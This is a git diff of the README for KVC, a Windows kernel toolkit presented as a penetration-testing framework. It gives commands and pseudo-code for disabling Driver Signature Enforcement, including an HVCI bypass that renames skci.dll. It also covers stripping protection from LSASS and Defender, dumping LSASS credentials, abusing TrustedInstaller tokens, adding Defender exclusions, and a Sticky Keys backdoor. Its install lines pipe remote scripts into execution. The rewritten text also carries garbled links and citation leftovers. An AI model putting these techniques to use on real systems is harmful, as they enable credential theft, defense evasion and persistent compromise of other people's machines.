@@ -1,1131 +1,1500 @@
+
+-----
+
 # KVC - Kernel Vulnerability Capabilities Framework
 
-<div align="center">
+\<div align="center"\>
 
-## ⚠️ **NEW FEATURE: Driver Signature Enforcement Control** ⚠️
-
-### 🔴 DSE ON/OFF - Runtime Kernel Memory Manipulation
-
-</div>
-
----
-
-**Latest Update:** KVC now supports runtime **Driver Signature Enforcement (DSE)** manipulation via `kvc.exe dse` commands.
-
-**⚠️ CRITICAL INFORMATION:**
-
-DSE bypass works on **ALL Windows systems** including:
-- ✅ Windows 11 24H2, 25H2
-- ✅ Windows Server (latest versions)
-- ✅ Systems with **Hyper-V enabled**
-- ✅ Systems with **SecureBoot enabled**
-- ✅ Systems with **HVCI/VBS enabled** (`g_CiOptions = 0x0001C006`)
-
-**All scenarios supported:**
-- 💚 **Standard systems** (`g_CiOptions = 0x00000006`): DSE bypass available
-- 💚 **HVCI/VBS enabled** (`g_CiOptions = 0x0001C006` or flags `0x0001C000`): DSE bypass **AVAILABLE** - hypervisor is bypassed
-
-**When Hyper-V and SecureBoot are active:**
-- ⚠️ **System restart is required** after DSE manipulation
-- ✅ **No files are modified** after reboot - changes are purely in-memory
-- ⚠️ DSE state persists for **one boot cycle only** - hypervisor restores protection on next reboot
-- 🔄 **Coming soon:** Persistent DSE disable switch across multiple reboots
-
-**Usage:**
-
-```powershell
-kvc.exe dse        # Check current DSE status and system compatibility
-kvc.exe dse off    # Disable signature enforcement (reboot required with Hyper-V/SecureBoot)
-kvc.exe dse on     # Re-enable signature enforcement
-```
-
-**📖 For complete documentation:**
-
-```powershell
-kvc.exe help       # View all available commands and options
-```
-
----
-
-<div align="center">
-
-[![License](https://img.shields.io/badge/license-Educational-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey.svg)]()
-[![Architecture](https://img.shields.io/badge/arch-x64-red.svg)]()
-[![Language](https://img.shields.io/badge/language-C%2B%2B%2FASM-orange.svg)]()
+[](https://www.google.com/search?q=LICENSE)
+[](https://www.google.com/search?q=)
+[](https://www.google.com/search?q=)
+[](https://www.google.com/search?q=)
 
 **Advanced Windows Security Research & Penetration Testing Framework**
 
-*Comprehensive Ring-0 toolkit for process protection manipulation, memory forensics, and advanced credential extraction on modern Windows platforms*
+*Comprehensive Ring-0 toolkit for process protection manipulation, memory forensics, advanced credential extraction, and Driver Signature Enforcement control on modern Windows platforms.*
 
-[🌐 Official Website](https://kvc.pl) • [📧 Contact](mailto:marek@wesolowski.eu.org) • [📱 +48 607-440-283](tel:+48607440283)
+[🌐 Official Website](https://kvc.pl) • [📧 Contact](mailto:marek@wesolowski.eu.org) • [📱 +48 607-440-283](https://www.google.com/search?q=tel:%2B48607440283)
 
----
+-----
 
-**Author:** Marek Wesołowski (WESMAR)  
-**Year:** 2025  
+**Author:** Marek Wesołowski (WESMAR)
+**Year:** 2025
 **Domain:** [kvc.pl](https://kvc.pl)
 
-</div>
+\</div\>
 
-<div align="center">
+-----
 
-## ✨ Quick Installation
+## 1\. Introduction and KVC Philosophy
 
-> **⚠️ Run PowerShell as Administrator!**  
-> Right-click PowerShell and select **"Run as Administrator"**
+### What is KVC?
 
-</div>
+The **Kernel Vulnerability Capabilities (KVC)** framework is a sophisticated toolkit designed for advanced Windows security research, penetration testing, and educational purposes. Operating primarily in kernel mode (Ring-0), KVC provides unprecedented access to and control over low-level system mechanisms typically shielded by modern Windows security features.
 
-### 🚀 GitHub Release (Recommended)
+### From Control to Capabilities
 
-```powershell
-irm https://github.com/wesmar/kvc/releases/download/v1.0.1/run | iex
-```
+Originally conceived as "Kernel Vulnerability **Control**," the framework's name evolved to emphasize its true nature: leveraging inherent **Capabilities**. Traditional security approaches often focus on *controlling* vulnerabilities from an external perspective. KVC, however, operates differently; it utilizes legitimate, albeit often undocumented or unintended, kernel-level capabilities to bypass security boundaries. This paradigm shift positions KVC not as a tool that simply breaks security, but as one that repurposes Windows' own mechanisms for in-depth analysis and manipulation.
 
-<div align="center">
-<strong>— OR —</strong>
-</div>
+### Core Capabilities
 
-### 🔄 Mirror
+KVC offers a wide array of functionalities for security professionals:
+
+  * **Driver Signature Enforcement (DSE) Control:** Temporarily disable DSE even on systems with HVCI/VBS enabled, allowing the loading of unsigned drivers for research purposes .
+  * **Process Protection (PP/PPL) Manipulation:** Modify or remove Protected Process Light (PPL) and Protected Process (PP) protections applied to critical system processes like LSASS, facilitating memory analysis and manipulation where standard tools fail .
+  * **Advanced Memory Dumping:** Create comprehensive memory dumps of protected processes (e.g., LSASS) by operating at the kernel level, bypassing user-mode restrictions .
+  * **Credential Extraction:** Extract sensitive credentials, including browser passwords (Chrome, Edge, Brave) and WiFi keys, utilizing techniques like DPAPI decryption via TrustedInstaller context and COM Hijacking (via the auxiliary `kvc_pass.exe` tool) .
+  * **TrustedInstaller Integration:** Execute commands and perform file/registry operations with the highest level of user-mode privilege (`NT SERVICE\TrustedInstaller`), enabling modification of system-protected resources.
+  * **Windows Defender Management:** Configure Defender exclusions and, critically, disable/enable the core security engine via registry manipulation requiring a system restart .
+  * **System Persistence:** Implement techniques like the Sticky Keys backdoor (IFEO hijack) for persistent access.
+  * **Stealth and Evasion:** Employ techniques like steganographic driver hiding (XOR-encrypted CAB within an icon resource) and atomic kernel operations to minimize forensic footprint .
+
+### Intended Use
+
+KVC is intended solely for legitimate security research, authorized penetration testing, incident response, and educational training. Unauthorized use is strictly prohibited and illegal.
+
+-----
+
+## 2\. Quick Installation and Requirements
+
+### Installation Methods
+
+#### 🚀 One-Command Installation (Recommended)
+
+Execute the following command in an **elevated PowerShell prompt** (Run as Administrator):
 
 ```powershell
 irm https://kvc.pl/run | iex
 ```
 
-<div align="center">
-<strong>— OR —</strong>
-</div>
+This command downloads a PowerShell script that handles the download, extraction, and setup of the KVC executable.
 
-### 📦 Manual Download
+#### 🔄 Mirror Installation
 
-Download: [kvc.7z](https://github.com/wesmar/kvc/releases/download/v1.0.1/kvc.7z)  
-Archive password: `github.com`
+Alternatively, use the mirror link:
 
----
----
-
-## 🚀 Executive Summary
-
-The **Kernel Vulnerability Capabilities (KVC)** framework represents a paradigm shift in Windows security research, offering unprecedented access to modern Windows internals through sophisticated ring-0 operations. Originally conceived as "Kernel Vulnerability Control," the framework has evolved to emphasize not just control, but the complete **exploitation of Windows kernel capabilities** for legitimate security research and penetration testing.
-
-KVC addresses the critical gap left by traditional forensic tools that have become obsolete in the face of modern Windows security hardening. Where tools like ProcDump and Process Explorer fail against Protected Process Light (PPL) boundaries, KVC succeeds by operating at the kernel level, manipulating the very structures that define these protections.
-
-## 🎯 Core Philosophy
-
-### The KVC Paradigm: From Control to Capabilities
-
-The evolution from "Kernel Vulnerability **Control**" to "Kernel Vulnerability **Capabilities**" reflects the framework's true purpose:
-
-- **Control**: Traditional approaches attempt to control vulnerabilities from the outside
-- **Capabilities**: KVC leverages inherent kernel capabilities to transcend security boundaries
-
-This subtle but crucial distinction positions KVC not as a tool that breaks Windows security, but as one that **utilizes legitimate kernel capabilities** in ways Microsoft never intended, effectively turning Windows' own security mechanisms into research instruments.
-
-### Architectural Principles
-
-1. **Atomic Operations**: Minimal kernel footprint with immediate cleanup
-2. **Dynamic Adaptation**: Runtime resolution of kernel structures for forward compatibility  
-3. **Legitimate Escalation**: Using Windows' own privilege escalation mechanisms
-4. **Steganographic Deployment**: Hiding kernel components within legitimate executables
-5. **Defense Evasion**: Direct syscalls to bypass endpoint monitoring
-
-## 🏗️ System Architecture
-
-```
-┌──────────────────────────────────────────────────────────────────────────────┐
-│                         KVC Ecosystem Architecture                           │
-├────────────────────────────────┬─────────────────────────────────────────────┤
-│       Primary Framework        │     Browser Credential Extraction Suite     │
-│          (kvc.exe)             │          (BrowserDecryptor.exe)             │
-├────────────────────────────────┼─────────────────────────────────────────────┤
-│      CLI Parser & Router       │     Target Management & Injection           │
-│  (kvc.cpp, HelpSystem.cpp)     │      (BrowserOrchestrator.cpp)              │
-├────────────────────────────────┴─────────────────────────────────────────────┤
-│                 Controller Core (Controller.h)                               │
-│ ┌───────────────────────────────────────────────────────────────────────────┐│
-│ │                 Atomic Operation Manager                                  ││
-│ │  - PerformAtomicInit() / PerformAtomicCleanup()                           ││
-│ └───────────────────────────────────────────────────────────────────────────┘│
-├──────────────────────────────────────────────────────────────────────────────┤
-│                   Low-Level System Integrators                               │
-├──────────────┬──────────────┬───────────────┬────────────────────────────────┤
-│    kvcDrv    │ OffsetFinder │ Trusted       │    Injection                   │
-│(Kernel I/F)  │ (Offset Res) │ Installer     │     Manager                    │
-│ [kvcDrv.cpp] │[OffsetF...]  │ [TrustedI...] │[BrowserOrch...]                │
-├──────────────┴──────────────┴───────────────┴────────────────────────────────┤
-│           In-Process Security Module (BrowseCrypt.dll)                       │
-├────────────────────────────────┬─────────────────────────────────────────────┤
-│   Self-Loader (PIC Entrypoint) │  SecurityOrchestrator (Main Logic)          │
-├────────────────────────────────┼─────────────────────────────────────────────┤
-│      MasterKeyDecryptor        │      DataExtractor (SQLite)                 │
-│  (COM Elevation Hijacking)     │ (AES-GCM Decryption)                        │
-├────────────────────────────────┴─────────────────────────────────────────────┤
-│            Direct Syscall Engine (syscalls.cpp)                              │
-├──────────────────────────────────────────────────────────────────────────────┤
-│             ABI Transition Trampoline (AbiTramp.asm)                         │
-├──────────────────────────────────────────────────────────────────────────────┤
-│                 Embedded Kernel Mode Driver (kvc.sys)                        │
-└──────────────────────────────────────────────────────────────────────────────┘
+```powershell
+irm https://github.com/wesmar/kvc/releases/download/v1.0.1/run | iex
 ```
 
-## 🔒 Process Protection Manipulation: The Heart of KVC
+#### 📦 Manual Download
 
-### Understanding Windows Process Protection Evolution
+1.  Download the `kvc.7z` archive from the [GitHub Releases](https://www.google.com/search?q=https://github.com/wesmar/kvc/releases) page or the official website.
+2.  Extract the archive using 7-Zip or a compatible tool.
+3.  The archive password is: `github.com`
+4.  Place the extracted `kvc.exe` file in a convenient location.
 
-Windows process protection has evolved through several generations, each addressing new attack vectors:
+### System Requirements
 
-#### Historical Context
-- **Windows XP/Vista**: Basic process isolation via access tokens
-- **Windows 7**: Introduction of Protected Processes (PP) for media DRM
-- **Windows 8/8.1**: Protected Process Light (PPL) for broader system services
-- **Windows 10/11**: Enhanced PPL with multiple signer types and HVCI integration
+  * **Operating System:** Windows 10 or Windows 11 (x64 architecture). Windows Server editions are also supported.
+  * **Architecture:** x64 only.
+  * **Privileges:** **Administrator privileges are mandatory** for almost all KVC operations due to kernel interactions, service management, and protected resource access.
 
-#### The Modern Protection Landscape
+-----
 
-Modern Windows implements a hierarchical protection model enforced at the kernel level:
+## 3\. System Architecture
 
-```cpp
-// EPROCESS._PS_PROTECTION bitfield structure
-typedef union _PS_PROTECTION {
-    UCHAR Level;
-    struct {
-        UCHAR Type : 3;      // PS_PROTECTED_TYPE (None, PPL, PP)
-        UCHAR Audit : 1;     // Auditing flag
-        UCHAR Signer : 4;    // PS_PROTECTED_SIGNER type
-    };
-} PS_PROTECTION, *PPS_PROTECTION;
+KVC employs a modular architecture designed for flexibility and stealth. The core components interact to achieve privileged operations:
+
+```mermaid
+graph LR
+    subgraph User Mode
+        A[kvc.exe CLI] --> B{Controller Core};
+        B --> C[Service Manager];
+        B --> D[TrustedInstaller Integrator];
+        B --> E[OffsetFinder];
+        B --> F[DSEBypass Logic];
+        B --> G[Session Manager];
+        B --> H[Filesystem/Registry Ops];
+        I[kvc_pass.exe] --> J[Browser COM Hijacking];
+        K[BrowseCrypt.dll] --> J;
+    end
+    subgraph Kernel Mode
+        L[kvcDrv (Driver Interface)] <--> M[kvc.sys (Embedded Driver)];
+    end
+    subgraph System Interaction
+        D --> N[NT SERVICE\TrustedInstaller];
+        H --> O[Registry];
+        H --> P[File System];
+        M --> Q[EPROCESS Structures];
+        M --> R[g_CiOptions];
+        J --> S[Browser Processes];
+    end
+
+    B <--> L;
 ```
 
-### KVC's Revolutionary Approach to Protection Manipulation
+**Conceptual Flow:**
 
-#### The Traditional Limitation
+1.  The user interacts with `kvc.exe` via the command-line interface.
+2.  The `Controller` class orchestrates the requested operation.
+3.  **Kernel Access:**
+      * The `Controller` uses `ServiceManager` to manage the lifecycle of the embedded kernel driver (`kvc.sys`).
+      * The driver (`kvc.sys`) is extracted steganographically (decrypted from an icon resource using XOR, decompressed from a CAB archive)  and loaded temporarily.
+      * Communication with the driver occurs via IOCTLs handled by the `kvcDrv` interface, allowing direct kernel memory read/write operations .
+4.  **Offset Resolution:** `OffsetFinder` dynamically locates the memory addresses of critical kernel structures (like `EPROCESS.Protection`, `g_CiOptions`) within `ntoskrnl.exe` and `ci.dll` by analyzing function code patterns, ensuring compatibility across Windows versions.
+5.  **Privilege Escalation:** `TrustedInstallerIntegrator` acquires the `NT SERVICE\TrustedInstaller` token, enabling modification of protected system files and registry keys .
+6.  **Feature Logic:** Specific modules handle core functionalities:
+      * `DSEBypass Logic` implements DSE control, including the HVCI bypass mechanism involving `skci.dll` manipulation.
+      * Protection manipulation logic within the `Controller` uses the driver to modify `EPROCESS.Protection` fields.
+      * Memory dumping uses elevated privileges (matching target process protection if necessary) and `MiniDumpWriteDump` .
+      * `SessionManager` tracks protection changes across reboots via the registry.
+7.  **Credential Extraction:**
+      * For Edge (DPAPI method) and WiFi, KVC uses the TrustedInstaller context to access necessary system secrets and files .
+      * For Chrome/Brave/Edge (full extraction), `kvc.exe` launches `kvc_pass.exe`, which injects `BrowseCrypt.dll` into a target browser process to perform COM hijacking for master key decryption. *(Note: Detailed implementation of `kvc_pass.exe` / `BrowseCrypt.dll` requires analysis of their specific code).*
+8.  **Cleanup:** After each operation (or on exit/Ctrl+C), the `Controller` performs an atomic cleanup, unloading the driver, removing the temporary service entry, and deleting temporary files to minimize forensic traces .
 
-Before KVC, security researchers faced an insurmountable barrier:
+-----
 
-```
-User Process (Administrator)  →  Kernel Security Reference Monitor  →  DENIED
-          ↓                                    ↓
-    "Access Denied"                   PPL Enforcement
-```
+## 4\. Basic Usage
 
-#### The KVC Solution: Elevation Through Legitimacy
+Interact with KVC using `kvc.exe` from an **elevated command prompt (cmd or PowerShell Run as Administrator)**.
 
-KVC bypasses this limitation by temporarily elevating its own protection level:
+### Getting Help
 
-```
-KVC Process (PPL-Matched)  →  Kernel Security Reference Monitor  →  GRANTED
-          ↓                                    ↓
-    "Access Granted"              Equal/Higher Protection Level
-```
+To view all available commands and options, use any of the following:
 
-#### Deep Dive: Protection Manipulation Algorithm
-
-The core protection manipulation algorithm in `Controller::SetProcessProtection` demonstrates KVC's sophisticated approach:
-
-```cpp
-// Pseudo-code representation of KVC's protection manipulation
-bool Controller::SetProcessProtection(DWORD pid, PS_PROTECTED_TYPE type, PS_PROTECTED_SIGNER signer) {
-    // 1. Dynamic kernel structure resolution
-    ULONG64 eprocessAddr = GetProcessKernelAddress(pid);
-    ULONG protectionOffset = OffsetFinder::GetProcessProtectionOffset();
-    
-    // 2. Construct new protection byte
-    UCHAR newProtection = (static_cast<UCHAR>(signer) << 4) | static_cast<UCHAR>(type);
-    
-    // 3. Atomic kernel memory modification
-    return kvcDrv.Write8(eprocessAddr + protectionOffset, newProtection);
-}
+```powershell
+kvc.exe help
+kvc.exe /?
+kvc.exe -h
 ```
 
-### Protection Types and Their Security Implications
+If a command is entered incorrectly, KVC will also display an error message and suggest using the help command .
 
-#### Protection Level Hierarchy (Type Field)
+### General Syntax
 
-```cpp
-enum class PS_PROTECTED_TYPE : UCHAR {
-    None = 0,           // Standard process - no protection
-    ProtectedLight = 1, // PPL - Limited protection, common for services
-    Protected = 2       // PP - Full protection, rare, media-related
-};
+```powershell
+kvc.exe <command> [subcommand] [arguments...] [options...]
 ```
 
-#### Signer Type Authority Levels
+  * `<command>`: The main action to perform (e.g., `dse`, `dump`, `unprotect`).
+  * `[subcommand]`: An optional secondary action (e.g., `dse off`, `service start`).
+  * `[arguments...]`: Required or optional values for the command (e.g., PID, process name, protection level).
+  * `[options...]`: Optional flags modifying behavior (e.g., `--output C:\path`).
 
-```cpp
-enum class PS_PROTECTED_SIGNER : UCHAR {
-    None = 0,          // No signature requirement
-    Authenticode = 1,  // Standard code signing
-    CodeGen = 2,       // .NET code generation
-    Antimalware = 3,   // Anti-malware vendors
-    Lsa = 4,          // Local Security Authority
-    Windows = 5,       // Microsoft Windows components
-    WinTcb = 6,        // Windows Trusted Computing Base
-    WinSystem = 7,     // Windows System components
-    App = 8           // Windows Store applications
-};
-```
+-----
 
-#### Real-World Protection Matrix
+## 5\. Driver Signature Enforcement (DSE) Control
 
-| Process | Type | Signer | KVC Capability |
-|---------|------|--------|----------------|
-| lsass.exe | PPL | WinTcb | ✅ Full Memory Access |
-| csrss.exe | PPL | Windows | ✅ Process Manipulation |
-| winlogon.exe | PPL | Windows | ✅ Token Duplication |
-| MsMpEng.exe | PPL | Antimalware | ⚠️ Requires Defender Disable |
-| services.exe | PPL | Windows | ✅ Service Management |
-| wininit.exe | PPL | Windows | ✅ System Integration |
+DSE is a Windows security feature that prevents loading drivers not signed by Microsoft. While crucial for security, it hinders legitimate kernel research and driver development. KVC provides a mechanism to temporarily disable DSE at runtime, even on highly secured systems.
 
-### Advanced Protection Scenarios
+### Understanding DSE and HVCI/VBS
 
-#### Scenario 1: LSASS Memory Acquisition
+  * **DSE:** Controlled by flags within the `g_CiOptions` variable in the `ci.dll` kernel module. A value of `0x6` typically indicates standard DSE enabled. Setting it to `0x0` disables the check.
+  * **HVCI/VBS (Hypervisor-Protected Code Integrity / Virtualization-Based Security):** On modern systems, HVCI uses virtualization to protect kernel memory, including `g_CiOptions`, from modification, even by code running in Ring-0. This state is often indicated by `g_CiOptions` having flags like `0x0001C000` set (e.g., `0x0001C006`).
 
-The LSASS process (Local Security Authority Subsystem Service) presents the most common target for credential extraction:
+KVC supports DSE control in **all scenarios**:
 
-```bash
-# Traditional approach (FAILS on modern Windows)
-procdump.exe -ma lsass.exe lsass.dmp
-# Result: Access Denied (0x80070005)
+  * ✅ Standard Systems (`g_CiOptions = 0x6`): Direct memory patch via the driver.
+  * ✅ HVCI/VBS Enabled Systems (`g_CiOptions = 0x0001C006` or similar): Requires a sophisticated bypass involving a reboot .
 
-# KVC approach (SUCCEEDS)
-kvc.exe dump lsass
-# Result: Full memory dump with credentials
-```
+### How KVC Bypasses DSE
 
-**KVC's Process:**
-1. Resolve LSASS EPROCESS address via kernel symbols
-2. Read current protection: `PPL-WinTcb`
-3. Elevate KVC to matching protection level
-4. Open privileged handle with `PROCESS_VM_READ`
-5. Create comprehensive memory dump
-6. Restore KVC to unprotected state
-7. Clean atomic operation artifacts
-
-#### Scenario 2: Anti-Malware Engine Bypass
-
-Windows Defender's MsMpEng.exe process uses PPL-Antimalware protection:
-
-```bash
-# Query current protection status
-kvc.exe get MsMpEng.exe
-# Output: Protected Process Light (PPL) - Antimalware (3)
-
-# Temporarily remove protection for analysis
-kvc.exe unprotect MsMpEng.exe
-
-# Perform analysis or inject monitoring code
-# ... custom analysis ...
-
-# Restore original protection
-kvc.exe protect MsMpEng.exe PPL Antimalware
-```
-
-#### Scenario 3: System Service Manipulation
-
-Critical Windows services often require protection removal for advanced research:
-
-```bash
-# List all protected processes
-kvc.exe list
-
-# Bulk protection removal for research environment
-kvc.exe unprotect all
-
-# Perform comprehensive system analysis
-# ... research activities ...
-
-# Selective protection restoration
-kvc.exe protect services.exe PPL Windows
-kvc.exe protect csrss.exe PPL Windows
-```
-
-## 🧠 Dynamic Kernel Structure Resolution
-
-### The Forward Compatibility Challenge
-
-Windows kernel structures evolve with each update, causing traditional hardcoded offset approaches to fail catastrophically. KVC solves this through **dynamic runtime resolution**.
-
-#### The OffsetFinder Engine
-
-```cpp
-class OffsetFinder {
-    // Load kernel image for static analysis
-    HMODULE ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
-    
-    // Locate exported function containing structure access
-    auto PsGetProcessId = GetProcAddress(ntoskrnl, "PsGetProcessId");
-    
-    // Parse machine code to extract offset
-    // x64: mov rax, [rcx+offset] -> Extract offset from instruction
-    ULONG offset = ParseMachineCode(PsGetProcessId);
-};
-```
-
-#### Cross-Validation for Reliability
-
-KVC employs multiple verification methods for critical offsets:
-
-```cpp
-ULONG FindProcessProtectionOffset() {
-    // Method 1: PsIsProtectedProcess analysis
-    ULONG offset1 = ExtractOffsetFromFunction("PsIsProtectedProcess");
-    
-    // Method 2: PsIsProtectedProcessLight analysis  
-    ULONG offset2 = ExtractOffsetFromFunction("PsIsProtectedProcessLight");
-    
-    // Cross-validation ensures accuracy
-    if (offset1 != offset2) {
-        throw std::runtime_error("Offset validation failed");
-    }
-    
-    return offset1;
-}
-```
-
-## 💾 Ring-0 Memory Acquisition: Beyond Traditional Limitations
-
-### The LSASS Challenge
-
-LSASS (Local Security Authority Subsystem Service) contains the crown jewels of Windows authentication:
-
-- **NTLM Hashes**: Password hashes for local and cached domain accounts
-- **Kerberos Tickets**: Active Directory authentication tokens
-- **DPAPI Master Keys**: Decryption keys for user secrets
-- **LSA Secrets**: System-wide sensitive configuration
-
-### KVC's Memory Acquisition Workflow
+#### Standard System (`g_CiOptions = 0x6`)
 
 ```mermaid
 sequenceDiagram
-    participant User as User Mode (KVC)
-    participant Kernel as Kernel Mode (kvc.sys)
-    participant LSASS as LSASS Process
-    
-    User->>Kernel: Load driver (atomic init)
-    User->>Kernel: Resolve LSASS EPROCESS address
-    User->>Kernel: Read LSASS protection level
-    Note over User: PPL-WinTcb detected
-    User->>Kernel: Elevate KVC to PPL-WinTcb
-    User->>LSASS: Open handle (PROCESS_VM_READ)
-    Note over User: Access granted due to matching protection
-    User->>LSASS: Create memory dump
-    User->>Kernel: Restore KVC protection to None
-    User->>Kernel: Unload driver (atomic cleanup)
+    participant User
+    participant KVC_EXE as kvc.exe
+    participant KVC_SYS as kvc.sys (Kernel)
+    participant CI_DLL as ci.dll (Kernel Memory)
+
+    User->>KVC_EXE: kvc dse off
+    KVC_EXE->>KVC_EXE: Load Driver (kvc.sys)
+    KVC_EXE->>KVC_SYS: Find g_CiOptions address
+    KVC_SYS-->>CI_DLL: Locate g_CiOptions
+    CI_DLL-->>KVC_SYS: Return Address
+    KVC_SYS-->>KVC_EXE: Return Address
+    KVC_EXE->>KVC_SYS: Read DWORD at Address
+    KVC_SYS-->>CI_DLL: Read Value (e.g., 0x6)
+    CI_DLL-->>KVC_SYS: Return Value
+    KVC_SYS-->>KVC_EXE: Return Value (0x6)
+    KVC_EXE->>KVC_EXE: Verify Value is 0x6
+    KVC_EXE->>KVC_SYS: Write DWORD 0x0 at Address
+    KVC_SYS-->>CI_DLL: Modify g_CiOptions = 0x0
+    KVC_SYS-->>KVC_EXE: Confirm Write
+    KVC_EXE->>KVC_EXE: Unload Driver
+    KVC_EXE-->>User: Success! DSE is OFF (No reboot needed)
 ```
 
-### Memory Dump Analysis Results
+**Explanation:** KVC loads its driver, locates `g_CiOptions` , reads the current value , verifies it's the expected standard DSE value (`0x6`) , and directly patches it to `0x0` using a kernel memory write operation. The driver is then unloaded. No reboot is required.
 
-A typical LSASS dump from KVC reveals:
+#### HVCI/VBS Enabled System (`g_CiOptions = 0x0001C006`)
 
-```
-LSASS Memory Dump Analysis
-├── Process: lsass.exe (PID: 756)
-├── Protection: PPL-WinTcb (Bypassed)
-├── Memory Regions: 1,247
-├── Total Size: 156.7 MB
-├── Credential Artifacts:
-│   ├── NTLM Hashes: 23 accounts
-│   ├── Kerberos Tickets: 7 TGTs, 15 TGSs
-│   ├── DPAPI Master Keys: 12 keys
-│   └── LSA Secrets: 8 entries
-└── Status: Complete extraction successful
-```
+This requires bypassing the hypervisor's memory protection. KVC uses a clever technique involving the Secure Kernel Client (`skci.dll`) library:
 
-## 🔐 Advanced Privilege Escalation: The TrustedInstaller Chain
+```mermaid
+sequenceDiagram
+    participant User
+    participant KVC_EXE as kvc.exe
+    participant TI as TrustedInstaller Integrator
+    participant OS as Windows OS
+    participant REG as Registry
+    participant FS as File System (System32)
+    participant HVCI as Hypervisor Protection
 
-### Understanding TrustedInstaller Authority
+    User->>KVC_EXE: kvc dse off
+    KVC_EXE->>KVC_EXE: Load Driver, Check g_CiOptions
+    Note over KVC_EXE: Detects HVCI (0x0001C006) 
+    KVC_EXE-->>User: HVCI detected, bypass needed. Reboot? [Y/N] 
+    User->>KVC_EXE: Y
+    KVC_EXE->>KVC_EXE: Unload Driver 
+    KVC_EXE->>TI: Rename skci.dll -> skci<U+200B>.dll 
+    TI->>FS: Rename file (Elevated)
+    KVC_EXE->>REG: Save Original g_CiOptions value 
+    KVC_EXE->>REG: Set RunOnce: kvc.exe dse off 
+    KVC_EXE->>OS: Initiate Reboot 
 
-The `NT SERVICE\TrustedInstaller` account represents the apex of Windows user-mode privilege:
+    rect rgb(230, 230, 255)
+    Note over OS: System Restarts...
+    OS-->>HVCI: Fails to load skci.dll (renamed)
+    Note over HVCI: HVCI Protection NOT Activated for this boot
+    OS->>REG: Execute RunOnce command: kvc.exe dse off
+    end
 
-- **Owns critical system files** and registry keys
-- **Bypasses most ACL restrictions**
-- **Can modify Windows Defender settings**
-- **Has full access to protected registry hives**
-
-### KVC's TrustedInstaller Acquisition Process
-
-```cpp
-bool TrustedInstallerIntegrator::ElevateToTrustedInstaller() {
-    // Step 1: Enable necessary privileges
-    EnablePrivilege(SE_DEBUG_NAME);
-    EnablePrivilege(SE_IMPERSONATE_NAME);
-    
-    // Step 2: Impersonate SYSTEM via winlogon.exe
-    HANDLE systemToken = GetProcessToken(FindProcess(L"winlogon.exe"));
-    ImpersonateLoggedOnUser(systemToken);
-    
-    // Step 3: Start TrustedInstaller service (requires SYSTEM)
-    SC_HANDLE scm = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
-    StartService(OpenService(scm, L"TrustedInstaller", SERVICE_ALL_ACCESS));
-    
-    // Step 4: Duplicate TrustedInstaller primary token
-    HANDLE tiProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 
-                                   FALSE, 
-                                   FindProcess(L"TrustedInstaller.exe"));
-    HANDLE tiToken;
-    DuplicateTokenEx(GetProcessToken(tiProcess), 
-                     MAXIMUM_ALLOWED, 
-                     nullptr, 
-                     SecurityImpersonation, 
-                     TokenPrimary, 
-                     &tiToken);
-    
-    // Step 5: Create privileged process with TI token
-    CreateProcessWithTokenW(tiToken, 0, L"cmd.exe", ...);
-}
+    KVC_EXE->>KVC_EXE: RunOnce executes 'kvc dse off'
+    KVC_EXE->>TI: Restore skci<U+200B>.dll -> skci.dll 
+    TI->>FS: Rename file back (Elevated)
+    KVC_EXE->>KVC_EXE: Load Driver
+    KVC_EXE->>KVC_EXE: Patch g_CiOptions -> 0x0 (Now possible!) 
+    KVC_EXE->>REG: Clear saved state 
+    KVC_EXE->>KVC_EXE: Unload Driver
+    Note over KVC_EXE: DSE is OFF for this boot session only
 ```
 
-### TrustedInstaller Use Cases
+**Explanation:**
 
-#### Windows Defender Bypass
+1.  KVC detects the HVCI state (`0x0001C006`).
+2.  It prompts the user for a required reboot.
+3.  If confirmed, KVC uses its `TrustedInstallerIntegrator` to rename `C:\Windows\System32\skci.dll` to `skci<U+200B>.dll` (using a Zero Width Space character U+200B). This prevents the Secure Kernel from loading on the next boot, thus disabling HVCI memory protection for *that specific boot session*.
+4.  KVC saves the original `g_CiOptions` value and sets up a `RunOnce` registry key to automatically execute `kvc.exe dse off` after the reboot.
+5.  The system is rebooted.
+6.  Upon reboot, HVCI fails to initialize because `skci.dll` isn't found. Kernel memory is now writable.
+7.  The `RunOnce` command executes `kvc dse off`.
+8.  This instance of KVC restores the original `skci.dll` name , loads the driver, patches `g_CiOptions` to `0x0` (now possible without HVCI protection) , cleans the registry state, and unloads the driver.
+9.  DSE remains disabled *only* for the current boot session. HVCI protection will be fully restored upon the *next* reboot because `skci.dll` is back in place. No system files are permanently modified.
 
-```bash
-# Add comprehensive exclusions with TrustedInstaller privileges
-kvc.exe trusted "powershell -Command Add-MpPreference -ExclusionPath C:\Research"
-kvc.exe trusted "powershell -Command Add-MpPreference -ExclusionProcess kvc.exe"
-kvc.exe trusted "powershell -Command Add-MpPreference -ExclusionExtension .dmp"
+### DSE Commands
+
+  * **Check DSE Status:**
+
+    ```powershell
+    kvc.exe dse
+    ```
+
+    Displays the kernel address and current hexadecimal value of `g_CiOptions`, along with an interpretation (Enabled/Disabled, HVCI status) .
+
+  * **Disable DSE:**
+
+    ```powershell
+    kvc.exe dse off
+    ```
+
+    Disables DSE. On standard systems, this is immediate . On HVCI systems, it prepares the bypass and initiates a reboot . If run *after* the reboot on an HVCI system (via RunOnce or manually), it completes the bypass by patching `g_CiOptions` and restoring `skci.dll` .
+
+  * **Enable DSE:**
+
+    ```powershell
+    kvc.exe dse on
+    ```
+
+    Restores the standard DSE enabled value (`0x6`) to `g_CiOptions` in kernel memory if it was previously set to `0x0` . This does *not* affect the HVCI bypass state if it was used; HVCI will re-enable on the next reboot regardless.
+
+**Important Notes:**
+
+  * DSE manipulation requires Administrator privileges.
+  * The HVCI bypass is temporary and lasts only for one boot cycle.
+  * Modifying kernel memory carries inherent risks, including potential system instability (BSOD) if interrupted or if unexpected system states are encountered. Proceed with caution.
+
+-----
+
+## 6\. Process Protection (PP/PPL) Manipulation
+
+Modern Windows protects critical processes using Protected Process Light (PPL) and Protected Process (PP) mechanisms. These prevent unauthorized access, such as memory reading or termination, even by administrators. KVC overcomes these limitations by operating at the kernel level.
+
+### Understanding PP/PPL
+
+Process protection is defined by the `_PS_PROTECTION` structure within the kernel's `EPROCESS` object for each process. It consists of:
+
+  * **Type:** Specifies the protection level (`None`, `ProtectedLight` (PPL), or `Protected` (PP)).
